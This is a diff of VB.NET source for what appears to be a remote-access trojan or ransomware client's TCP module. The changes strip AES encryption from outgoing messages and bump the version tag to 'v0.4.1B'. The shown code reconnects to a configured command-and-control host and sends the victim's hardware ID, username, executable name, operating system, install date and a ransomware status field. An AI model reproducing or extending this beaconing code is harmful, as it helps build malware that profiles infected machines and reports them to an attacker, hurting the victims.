@@ -22,7 +22,7 @@ Public Class TCP
         End Try
     End Sub
     Public Sub Send(ByVal S As String)
-        Send(SB(AES_Encrypt(S)))
+        Send(SB(S))
     End Sub
     Private CN As Boolean = False
     Sub RC()
@@ -83,7 +83,7 @@ e:      ' clear things and ReConnect
             lp = 0
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CN = True
-            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1" & KEY & ID.MyOS & KEY & ID.INDATE & KEY & ID.Ransomeware & KEY & "")
+            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1B" & KEY & ID.MyOS & KEY & ID.INDATE & KEY & ID.Ransomeware & KEY & "")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(2500)
             GoTo e
